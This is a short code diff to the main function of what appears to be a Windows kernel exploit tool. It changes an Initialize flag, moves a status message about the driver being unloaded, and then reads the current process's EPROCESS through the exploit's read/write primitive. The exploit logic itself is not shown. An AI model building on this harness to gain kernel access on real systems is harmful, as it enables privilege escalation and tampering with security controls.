@@ -3,7 +3,7 @@
 int main() {
     printf("-----                                Starting                                     -----\n");
     Kernel exploit;
-    NTSTATUS exploitStatus = exploit.Initialize(true);
+    NTSTATUS exploitStatus = exploit.Initialize(false);
     // Initialize the exploit
     if (exploitStatus) {
         printf("[-] Exploit failed to initialize (%llx)\n", exploitStatus);
@@ -16,9 +16,9 @@ int main() {
             printf("[-] Exploit failed to cleanup (%llx)\n", cleanupStatus);
             return -1;
         }
+        printf("----- Driver Is unloaded at this point utilizing only the exploit for read/write -----\n");
     }    
 
-    printf("----- Driver Is unloaded at this point utilizing only the exploit for read/write -----\n");
 
     // Retrieve current process details
     __int64 currentProcess = exploit.EProcess(GetCurrentProcessId());
